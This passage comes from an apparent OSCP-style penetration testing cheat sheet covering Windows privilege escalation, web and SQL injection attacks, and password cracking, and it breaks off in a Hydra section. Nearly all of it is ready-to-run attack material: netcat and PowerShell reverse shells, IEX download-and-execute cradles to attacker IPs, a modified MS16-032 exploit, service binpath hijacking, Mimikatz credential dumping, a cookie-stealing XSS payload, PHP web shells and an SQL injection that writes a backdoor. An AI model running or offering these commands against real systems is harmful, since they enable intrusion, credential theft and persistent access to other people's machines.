    <https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc>

- Windows Run As - Switching users in linux is trival with the `SU` command.  However, an equivalent command does not exist in Windows.  Here are 3 ways to run a command as a different user in Windows.

### Sysinternals

Sysinternals **psexec** is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).

      ```CMD
      C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 

      PsExec v2.2 - Execute processes remotely
      Copyright (C) 2001-2016 Mark Russinovich
      Sysinternals - www.sysinternals.com
      ```

### Windows Run As

- Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:

      ```CMD
      C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
      Enter the password for Test:
      Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
      ```

Prior to successfully performing a Windows run as, we of course need a valid windows username and password. Here is a oneliner powershell script to verify a username / password is valid on the local system:

- Requires .Net 3.5
  `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$username = '<username here>'; $password = '<password here>'; $computer = $env:COMPUTERNAME; Add-Type -AssemblyName System.DirectoryServices.AccountManagement; $obj = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$computer); $obj.ValidateCredentials($username, $password); }"`

- Requires .Net 2.0:
  `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$username = '<username here>'; $password = '<password here>'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Start-Process -FilePath C:\Windows\System32\calc.exe -NoNewWindow -Credential $credential; }"`

**Switching users** in linux is trival with the SU command. However, an equivalent command does not exist in Windows. Here are 3 ways to run a command as a different user in Windows.

  
### PowerShell

**Powershell** can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.

  ```powershell
  $username = '<username here>'
  $password = '<password here>'
  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
  Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
  ```

- Next run this script using powershell.exe:
  `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`

### Others

- Windows Service Configuration Viewer - Check for misconfigurations in services that can lead to privilege escalation. You can replace the executable with your own and have windows execute whatever code you want as the privileged user.  
    - `icacls scsiaccess.exe`

    ```text
    scsiaccess.exe  
    NT AUTHORITY\SYSTEM:(I)(F)  
    BUILTIN\Administrators:(I)(F)  
    BUILTIN\Users:(I)(RX)  
    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
    Everyone:(I)(F)
    ```

- If for example, service `UsoSvc` is having **AllAccess, Start** set, you can change the binary path to execute what we want:
  - First stop the service via `sc.exe stop UsoSvc`
  - Second, change the binary path of the service via the command. _In this case, my reverse shell was of nishang and would autoexecute within powershell to create a reverse shell_!
    - `sc.exe config UsoSvc binpath="powershell.exe 'IEX( IWR http://10.10.14.19:8000/rev.ps1 -UseBasicParsing)'"`
  - Last, start the service: `sc.exe start UsoSvc`

    **If this method doesn't work, change the command to base64 little endian sometimes it works!**
    - `echo "IEX( IWR http://10.10.14.19:8000/rev.ps1 -UseBasicParsing)" | iconv -t utf-16le|base64 -w 0`
    - `sc.exe config UsoSvc binpath="powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADkAOgA4ADAAMAAwAC8AcgBlAHYALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA=="`
    Or
    - `sc.exe config UsoSvc binpath="cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADkAOgA4ADAAMAAwAC8AcgBlAHYALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA=="`

- Compile a custom add user command in windows using C  

  ```shell
  root@kali:~# cat useradd.c  
  #include <stdlib.h> /* system, NULL, EXIT_FAILURE */  
  int main ()  
  {  
  int i;  
  i=system ("net localgroup administrators low /add");  
  return 0;  
  }
  ```  

    - `i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c`

- Group Policy Preferences (GPP) 

A common useful misconfiguration found in modern domain environments is unprotected Windows GPP settings files
  - map the Domain controller SYSVOL share  
    - `net use z:\\dc01\SYSVOL`
  - Find the GPP file: Groups.xml  
    - `dir /s Groups.xml`
  - Review the contents for passwords  
    - `type Groups.xml`
  - Decrypt using GPP Decrypt  
    - `gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB`
- Find and display the proof.txt or flag.txt - get the loot!
    
    ```shell
    #meterpreter>run  post/windows/gather/win_privs
    cd\ & dir /b /s proof.txt
    type c:\pathto\proof.txt
    ```

### Windows Kernel Exploit (MS16-032)

If the remote machine appears to be vulnerable to MS16-032, we can execute a powershell script from a remote server to exploit it.

  ```shell
  Title      : Secondary Logon Handle
  MSBulletin : MS16-032
  CVEID      : 2016-0099
  Link       : https://www.exploit-db.com/exploits/39719/
  VulnStatus : Appears Vulnerable
  ```

Get the Powershell script from FuzzySecurity's Github, add an invoke to the end of the script and share the folder using the python SimpleHTTPServer:

  ```shell
  root@kali:~test# git clone https://github.com/FuzzySecurity/PowerShell-Suite.git
  Cloning into 'PowerShell-Suite'...
  remote: Enumerating objects: 378, done.
  remote: Total 378 (delta 0), reused 0 (delta 0), pack-reused 378
  Receiving objects: 100% (378/378), 5.94 MiB | 2.06 MiB/s, done.
  Resolving deltas: 100% (179/179), done.
  root@kali:~test# cd PowerShell-Suite/
  root@kali:~test/PowerShell-Suite# echo Invoke-MS16-032 >> Invoke-MS16-032.ps1 
  root@kali:~test/PowerShell-Suite# python -m Simple
  SimpleDialog        SimpleHTTPServer    SimpleXMLRPCServer  
  root@kali:~test/PowerShell-Suite# python -m SimpleHTTPServer 80
  ```

The default version of the MS16-032 script will create a Pop-up CMD.exe window on the remote machine. Unfortunatly, we cannot access this from a limited shell... BUT we can modify the exploit to call a reverse shell. Its pretty easy to modify it to call a reverse powershell that will connect back to our machine with a System shell. We will need to modify line 330 of the exploit (the ip address and port will need to be updated of course):

  ```powershell
  # LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
  #$CallResult = [Advapi32]::CreateProcessWithLogonW(
  #    "user", "domain", "pass",
  #    0x00000002, "C:\Windows\System32\cmd.exe", "",
  #    0x00000004, $null, $GetCurrentPath,
  #    [ref]$StartupInfo, [ref]$ProcessInfo)

  # Modified to create a Powershell reverse shell 
  $CallResult = [Advapi32]::CreateProcessWithLogonW(
      "user", "domain", "pass",
      0x00000002, 
      'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 
      '-NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"',
      0x00000004, $null, $GetCurrentPath,
      [ref]$StartupInfo, [ref]$ProcessInfo)
  ```

- On the remote host execute the exploit:
  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-MS16-032.ps1'))"`

- Or from a Windows Powershell:
  `IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Invoke-MS16-032.ps1')`

- Or if you wanted to upload the exploit, you can always run it like this:
  `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"`

On our Kali machine we create the reverse shell and ... BOOM! Root dance.

  ```shell
  root@kali:~# nc -nlvp 4444
  listening on [any] 4444 ...
  connect to [10.10.10.11] from (UNKNOWN) [10.10.10.10] 49182

  PS C:\Users\jimmy^> whoami
  nt authority\system
  ```

### Potato Attacks

#### RottenPotato
Service accounts usually have special privileges (SeImpersonatePrivileges) and this could be used to escalate privileges.

<https://github.com/breenmachine/RottenPotatoNG>

#### Juicy Potato

When you have **SeImpersonate** or **SeAssignPrimaryToken** privileges available within windows; you can carry out Juict Potato Attack. We can do a `whoami /priv` to get an indication of privs:

```text
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```
Which means `JuicyPotato.exe` is a good method of escalation. 

- Download the JuicyPotato Binary from: <https://github.com/ohpe/juicy-potato>
- Let's download it to the victim machine via:
   `(new-object net.webclient).downloadfile('http://10.10.14.10/jp.exe', 'C:\users\merlin\desktop\jp.exe')`
- Create a `Invoke-PowerShellTcp.ps1` file with contents of *nishang* `Inovke-PowerShellTcp.ps1` and ammend it with:
   `echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 9002" >> Invoke-PowerShellTcp.ps1`
  *Don't forget to start the shell (P=9002)*
- And run the `JP.exe`:
   `./jp.exe -l 1337 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.10/Invoke-PowerShellTcp.ps1')" -t *`
- There is a list of CLSID for JuicyPotato here[https://ohpe.it/juicy-potato/CLSID/]. 

**It’s nearly impossible to prevent the abuse of all these COM Servers. You could think about modifying the permissions of these objects via DCOMCNFG but good luck, this is gonna be challenging.**

### Fireeye Session Gopher

Leveraging credentials is still the most common ways of privledge escalation in Windows environments. Session Gopher is a PowerShell script designed to automaticlly harvest credentials from commonly used applications.

- To run Session Gopher, we will first need to pull down the latest version from the Fireeye github repository:
  `git clone https://github.com/fireeye/SessionGopher`
- Next we can serve it up on our local KALI instance by using the simple python HTTP server:

  ```shell
  root@kali:~/tools# cd SessionGopher/
  root@kali:~/tools/SessionGopher# ls
  README.md  SessionGopher.ps1
  root@kali:~/tools/SessionGopher# python -m SimpleHTTPServer 80
  Serving HTTP on 0.0.0.0 port 80 ...
  ```

- Finally we can file-lessly execute it from our remote Windows shell:
  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/SessionGopher.ps1')); Invoke-SessionGopher -Thorough"`
- Or from a Windows Powershell:
  `IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/SessionGopher.ps1')`
- Or we can download and run it:
  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/SessionGopher.ps1\", \"C:\\Users\\Public\\Downloads\\SessionGopher.ps1\");`
  and
  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "& { . .\SessionGopher.ps1; Invoke-SessionGopher -Thorough}"`


### Running Mimikatz

Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of plaintext credentials from memory, password hashes from local SAM/NTDS.dit databases, advanced Kerberos functionality, and more.
<https://github.com/gentilkiwi/mimikatz>

#### Running traditional (binary) Mimikatz

The original and most frequently updated version of Mimikatz is the binary executable which can be found here:
<https://github.com/gentilkiwi/mimikatz/releases>

- First we will need to download a Mimikatz binary and copy it to the remote machine

  ```shell
  root@kali:~/test# wget https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip     
  --2018-10-16 15:14:49--  https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip                     
  root@kali:~/test# unzip mimikatz_trunk.zip
  ```

- Now we will need to copy the 3 files (win32 or x64 depending on the OS) required to run Mimikatz to the remote server.
  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimidrv.sys\", \"C:\\Users\\Public\\Downloads\\mimidrv.sys\"); (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimikatz.exe\", \"C:\\Users\\Public\\Downloads\\mimikatz.exe\"); (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimilib.dll\", \"C:\\Users\\Public\\Downloads\\mimilib.dll\")"`
- Now, if we dont have an overly interactive shell, we will want to execute Mimikatz without the built in CLI by passing the correct parameters to the executable. We use the log parameter to also log the clear password results to a file (just in case we are unable to see the output).
  `mimikatz log version "sekurlsa::logonpasswords" exit`

- Otherwise we can use the Mimikatz shell to get the passwords:

  ```CMD
  mimikatz.exe
  mimikatz # privilege::debug
  Privilege '20' OK
  mimikatz # sekurlsa::logonpasswords
  ```

#### Running Powershell Mimikatz

The Powershell version is not as frequently updated, but can be loaded into memory without ever hitting the HDD (Fileless execution). This version simply reflectively loads the Mimikatz binary into memory so we could probably update it ourselves without much difficulty.
  `wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1`

- Fileless execution of Mimikatz from remotely hosted server:
  `IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds`

### Capture a screen shot

The following powershell commands can be used to capture a screen shot of the remote computers desktop and store it as a BMP file.

```powershell
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
$bitmap.Save('screen1.bmp')
```

- If you are on CMD you can use this handy one-liner to execute the same powershell command

`@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height; $graphic = [System.Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size); $bitmap.Save('screen1.bmp')"`

## Client, Web and Password Attacks

### Client Attacks

- MS12-037- Internet Explorer 8 Fixed Col Span ID  
      wget -O exploit.html
      <http://www.exploit-db.com/download/24017>  
      service apache2 start
- JAVA Signed Jar client side attack  
      echo '<applet width="1" height="1" id="Java Secure"
      code="Java.class" archive="SignedJava.jar"><param name="1"
      value="http://$ip:80/evil.exe"></applet>' >
      /var/www/html/java.html  
      User must hit run on the popup that occurs.
- Linux Client Shells  
      [*http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/*](http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)

- Setting up the Client Side Exploit

- Swapping Out the Shellcode

- Injecting a Backdoor Shell into Plink.exe  
      backdoor-factory -f /usr/share/windows-binaries/plink.exe -H $ip
      -P 4444 -s reverse_shell_tcp

### Web Attacks

- Web Shag Web Application Vulnerability Assessment Platform  
      webshag-gui

- Web Shells  
      [*http://tools.kali.org/maintaining-access/webshells*](http://tools.kali.org/maintaining-access/webshells)  
      `ls -l /usr/share/webshells/`

- Generate a PHP backdoor (generate) protected with the given
      password (s3cr3t)  
      weevely generate s3cr3t  
      weevely <http://$ip/weevely.php> s3cr3t

- Java Signed Applet Attack

- HTTP / HTTPS Webserver Enumeration

  - OWASP Dirbuster

  - nikto -h $ip

- Essential Iceweasel Add-ons  
      Cookies Manager
      <https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/>  
      Tamper Data  
      <https://addons.mozilla.org/en-US/firefox/addon/tamper-data/>

- Cross Site Scripting (XSS)  
      significant impacts, such as cookie stealing and authentication
      bypass, redirecting the victim’s browser to a malicious HTML
      page, and more

- Browser Redirection and IFRAME Injection

      ```html
      <iframe SRC="http://$ip/report" height = "0" width="0"></iframe>
      ```

- Stealing Cookies and Session Information

      ```javascript
      <javascript>  
      new image().src="http://$ip/bogus.php?output="+document.cookie;  
      </script>
      ```

      nc -nlvp 80

## File Inclusion Vulnerabilities

- Local (LFI) and remote (RFI) file inclusion vulnerabilities are
      commonly found in poorly written PHP code.

- fimap - There is a Python tool called fimap which can be
      leveraged to automate the exploitation of LFI/RFI
      vulnerabilities that are found in PHP (sqlmap for LFI):  
      [*https://github.com/kurobeats/fimap*](https://github.com/kurobeats/fimap)

  - Gaining a shell from phpinfo()  
          fimap + phpinfo() Exploit - If a phpinfo() file is present,
          it’s usually possible to get a shell, if you don’t know the
          location of the phpinfo file fimap can probe for it, or you
          could use a tool like OWASP DirBuster.

- For Local File Inclusions look for the include() function in PHP
      code.

      ```php  
      include("lang/".$_COOKIE['lang']);  
      include($_GET['page'].".php");
      ```

- LFI - Encode and Decode a file using base64  

      ```shell
      curl -s \
      "http://$ip/?page=php://filter/convert.base64-encode/resource=index" \
      | grep -e '\[^\\ \]\\{40,\\}' | base64 -d
      ```

- There is a tool called Kadimus to test LFI too

- dotdotpwn is another tool to test for LFI

- LFI - Download file with base 64 encoding  
      [*http://$ip/index.php?page=php://filter/convert.base64-encode/resource=admin.php*](about:blank)

- LFI Linux Files:  
      /etc/issue  
      /proc/version  
      /etc/profile  
      /etc/passwd  
      /etc/passwd  
      /etc/shadow  
      /root/.bash_history  
      /var/log/dmessage  
      /var/mail/root  
      /var/spool/cron/crontabs/root

- LFI Windows Files:  
      %SYSTEMROOT%\\repair\\system  
      %SYSTEMROOT%\\repair\\SAM  
      %SYSTEMROOT%\\repair\\SAM  
      %WINDIR%\\win.ini  
      %SYSTEMDRIVE%\\boot.ini  
      %WINDIR%\\Panther\\sysprep.inf  
      %WINDIR%\\system32\\config\\AppEvent.Evt

- LFI OSX Files:  
      /etc/fstab  
      /etc/master.passwd  
      /etc/resolv.conf  
      /etc/sudoers  
      /etc/sysctl.conf

- LFI - Download passwords file  
      [*http://$ip/index.php?page=/etc/passwd*](about:blank)  
      [*http://$ip/index.php?file=../../../../etc/passwd*](about:blank)

- LFI - Download passwords file with filter evasion  
      [*http://$ip/index.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd*](about:blank)

- Local File Inclusion - In versions of PHP below 5.3 we can
      terminate with null byte  
      GET
      /addguestbook.php?name=Haxor&comment=Merci!&LANG=../../../../../../../windows/system32/drivers/etc/hosts%00

- Contaminating Log Files `<?php echo shell_exec($_GET['cmd']);?>`

- For a Remote File Inclusion look for php code that is not  sanitized and passed to the PHP include function and the php.ini
      file must be configured to allow remote files

      */etc/php5/cgi/php.ini* - "allow_url_fopen" and "allow_url_include" both set to "on"  

      `include($_REQUEST["file"].".php");`

- Remote File Inclusion  

       `http://192.168.11.35/addguestbook.php?name=a&comment=b&LANG=http://192.168.10.5/evil.txt`

       `<?php echo shell_exec("ipconfig");?>`

- Simple shell to upload and execute commands

<?php echo system($_REQUEST['cmd']) ?>

- Drupal Scanner

drupscan

- Joomla Scanner

joomscan

## Database Vulnerabilities

- Playing with SQL Syntax
    A great tool I have found for playing with SQL Syntax for a variety of database types (MSSQL Server, MySql, PostGreSql, Oracle) is SQL Fiddle:

    <http://sqlfiddle.com>

    Another site is rextester.com:

    <http://rextester.com/l/mysql_online_compiler>

### Detecting SQL Injection Vulnerabilities.

Most modern automated scanner tools use time delay techniques to detect SQL injection vulnerabilities.  This method can tell you if a SQL injection vulnerability is present even if it is a "blind" sql injection vulnerabilit that does not provide any data back.  You know your SQL injection is working when the server takes a LOooooong time to respond.  I have added a line comment at the end of each injection statement just in case there is additional SQL code after the injection point.

1. MSSQL Server SQL Injection Time Delay Detection:
- Add a 30 second delay to a MSSQL Server Query
  - *Original Query* `SELECT * FROM products WHERE name='Test';`
  - *Injection Value* `'; WAITFOR DELAY '00:00:30'; --`
  - *Resulting Query* `SELECT * FROM products WHERE name='Test'; WAITFOR DELAY '00:00:30'; --`
  
2. MySQL Injection Time Delay Detection:
- Add a 30 second delay to a MySQL Query
   - *Original Query* `SELECT * FROM products WHERE name='Test';`
   - *Injection Value* `'-SLEEP(30); #`
   - *Resulting Query* `SELECT * FROM products WHERE name='Test'-SLEEP(30); #`

3. PostGreSQL Injection Time Delay Detection:
- Add a 30 second delay to an PostGreSQL Query
  - *Original Query* `SELECT * FROM products WHERE name='Test';`
  - *Injection Value* `'; SELECT pg_sleep(30); --`
  - *Resulting Query* `SELECT * FROM products WHERE name='Test'; SELECT pg_sleep(30); --`

- Grab password hashes from a web application mysql database called “Users” - once you have the MySQL root username and password 

  ```
  mysql -u root -p -h $ip
  use "Users"  
  show tables;  
  select \* from users;
  ```

- Authentication Bypass  
  - `name='wronguser' or 1=1;`
  - `name='wronguser' or 1=1 LIMIT 1;`

- Enumerating the Database  
  - `http://192.168.11.35/comment.php?id=738)'`  
- Verbose error message?  
  - `http://$ip/comment.php?id=738 order by 1`
  - `http://$ip/comment.php?id=738 union all select 1,2,3,4,5,6`
- Determine MySQL Version:  
  - `http://$ip/comment.php?id=738 union all select 1,2,3,4,@@version,6`
- Current user being used for the database connection:
  - `http://$ip/comment.php?id=738 union all select 1,2,3,4,user(),6`
- Enumerate database tables and column structures  
  - `http://$ip/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables`
- Target the users table in the database  
  - `http://$ip/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'`
- Extract the name and password  
  - `http://$ip/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users`
- Create a backdoor
  - `http://$ip/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'`

### SQLMap Examples

- Crawl the links
  - `sqlmap -u http://$ip --crawl=1`
  - `sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3`

- SQLMap Search for databases against a suspected GET SQL Injection
  - `sqlmap –u http://$ip/blog/index.php?search –dbs`

- SQLMap dump tables from database oscommerce at GET SQL injection
  - `sqlmap –u http://$ip/blog/index.php?search= –dbs –D oscommerce –tables –dumps`

- SQLMap GET Parameter command  
  - `sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --dump -threads=5`

- SQLMap Post Username parameter
  - `sqlmap -u http://$ip/login.php --method=POST --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3 --level=5 --dbms=MySQL --dump-all`

- SQL Map OS Shell
  - `sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --osshell`
  - `sqlmap -u http://$ip/login.php --method=POST --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3 --level=5 --dbms=MySQL --os-shell`

- Automated sqlmap scan
  - `sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords  --file-read="/var/www/blah.php"`

- Targeted sqlmap scan
  - `sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump`

- Scan url for union + error based injection with mysql backend and use a random user agent + database dump  
  - `sqlmap -o -u http://$ip/index.php --forms --dbs  `
  - `sqlmap -o -u "http://$ip/form/" --forms`
  
- Sqlmap check form for injection  
  - `sqlmap -o -u "http://$ip/vuln-form" --forms -D database-name -T users --dump`
   
- Enumerate databases  
  - `sqlmap --dbms=mysql -u "$URL" --dbs`
  
- Enumerate tables from a specific database  
  - `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables  `
    
- Dump table data from a specific database and table  
  - `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump `
     
- Specify parameter to exploit  
  - `sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2 `
      
- Specify parameter to exploit in 'nice' URIs (exploits param1)
  - `sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs `
       
- Get OS shell  
  - `sqlmap --dbms=mysql -u "$URL" --os-shell`
         
- Get SQL shell  
  - `sqlmap --dbms=mysql -u "$URL" --sql-shell`
          
- SQL query  
  - `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"` 
           
- Use Tor Socks5 proxy  
  - `sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs`


### NoSQLMap Examples

You may encounter NoSQL instances like MongoDB in your OSCP journies (`/cgi-bin/mongo/2.2.3/dbparse.py`).  NoSQLMap can help you to automate NoSQLDatabase enumeration.

- NoSQLMap Installation

  ```shell
  git clone https://github.com/codingo/NoSQLMap.git
  cd NoSQLMap/
  ls
  pip install couchdb
  pip install pbkdf2
  pip install ipcalc
  python nosqlmap.py
  ```

- Often you can create an exception dump message with MongoDB using a malformed NoSQLQuery such as:
  - `a'; return this.a != 'BadData’'; var dummy='!`

## Password Attacks

- AES Decryption <http://aesencryption.net/>
- Convert multiple webpages into a word list
    ```shell
    for x in 'index' 'about' 'post' 'contact' ; do \
    curl http://$ip/$x.html | html2markdown | tr -s ' ' '\\n' >> webapp.txt ; \
    done
    ```
- Or convert html to word list dict `html2dic index.html.out | sort -u > index-html.dict`
- Default Usernames and Passwords
- CIRT [*http://www.cirt.net/passwords*](http://www.cirt.net/passwords)
- Government Security - Default Logins and Passwords for Networked Devices
  - [*http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php*](http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php)
- Virus.org [*http://www.virus.org/default-password/*](http://www.virus.org/default-password/)
- Default Password [*http://www.defaultpassword.com/*](http://www.defaultpassword.com/)

### Brute Force

- Nmap Brute forcing Scripts  
  - [*https://nmap.org/nsedoc/categories/brute.html*](https://nmap.org/nsedoc/categories/brute.html)
- Nmap Generic auto detect brute force attack:
  - `nmap --script brute -Pn <target.com or ip>`
- MySQL nmap brute force attack:
  - `nmap --script=mysql-brute $ip`

### Dictionary Files

- Word lists on Kali `cd /usr/share/wordlists`
- Key-space Brute Force
  - `crunch 6 6 0123456789ABCDEF -o crunch1.txt`
  - `crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha`
  - `crunch 8 8 -t ,@@^^%%%`
- Pwdump and Fgdump - Security Accounts Manager (SAM)
  - `pwdump.exe` - attempts to extract password hashes
  - `fgdump.exe` - attempts to kill local antiviruses before attempting to dump the password hashes and cached credentials.

### Windows Credential Editor (WCE)

- allows one to perform several attacks to obtain clear text passwords and hashes. Usage: `wce -w`
- Mimikatz
- extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets 
  [*https://github.com/gentilkiwi/mimikatz*](https://github.com/gentilkiwi/mimikatz)
  From metasploit meterpreter (must have System level access):

  ```
  meterpreter> load mimikatz
  meterpreter> help mimikatz
  meterpreter> msv
  meterpreter> kerberos
  meterpreter> mimikatz_command -f samdump::hashes
  meterpreter> mimikatz_command -f sekurlsa::searchPasswords
  ```

- Password Profiling
  - cewl can generate a password list from a web page `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`

- Password Mutating
  - John the ripper can mutate password lists:
    - `nano /etc/john/john.conf`
    - `john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt`

- Medusa
  - Medusa, initiated against an htaccess protected web directory `medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 10`

- Ncrack
  - ncrack (from the makers of nmap) can brute force RDP `ncrack -vv --user offsec -P password-file.txt rdp://$ip`

### Hydra

- Hydra brute force against SNMP  
  - `hydra -P password-file.txt -v $ip snmp`

- Hydra FTP known user and rockyou password list  
  - `hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp`

- Hydra SSH using list of users and passwords  
  - `hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh`

- Hydra SSH using a known password and a username list  
  - `hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh`

- Hydra SSH Against Known username on port 22
  - `hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt`

- Hydra POP3 Brute Force  
  - `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V`

- Hydra SMTP Brute Force  
  - `hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V`

- Hydra attack http get 401 login with a dictionary  
